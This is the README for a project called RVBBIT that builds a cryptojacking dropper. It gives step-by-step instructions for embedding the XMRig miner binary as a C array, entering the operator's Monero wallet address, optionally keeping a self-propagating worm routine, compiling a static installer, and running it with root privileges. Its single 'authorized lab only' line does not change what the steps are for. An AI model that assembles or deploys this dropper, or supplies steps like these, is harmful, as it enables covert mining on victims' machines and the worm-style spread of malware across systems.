# Project RVBBIT – The Nightmare

## Embedding the XMRig Payload

For legal and ethical reasons, the cryptocurrency miner payload is **not** included in the source tree. You must embed it manually before building:

1. Download the static XMRig binary from the [official releases](https://github.com/xmrig/xmrig/releases).
2. Convert it to a C array:
   ```bash
   xxd -i xmrig > xmrig_payload.h
3. Open rvbbit.c and replace the placeholder lines (unsigned char xmrig_bin[] = { /* ARRAY */ }; and unsigned int xmrig_bin_len = 0;) with the content of xmrig_payload.h.

4. Update WALLET_ADDRESS to your Monero wallet address.

5. (Optional) Modify or disable the worm functionality in rvbbit_init() if self-propagation is not desired.

## Building the Dropper
Run the build script from within a Linux environment (native or WSL2):

bash
chmod +x build.sh
./build.sh
This will produce the static ELF binary rvbbit_installer. The binary is not committed to the repository.

## Deploying
### Copy rvbbit_installer to an isolated test VM and execute with root privileges:

bash
chmod +x rvbbit_installer
sudo ./rvbbit_installer
### Warning: Only deploy in controlled, authorized laboratory environments.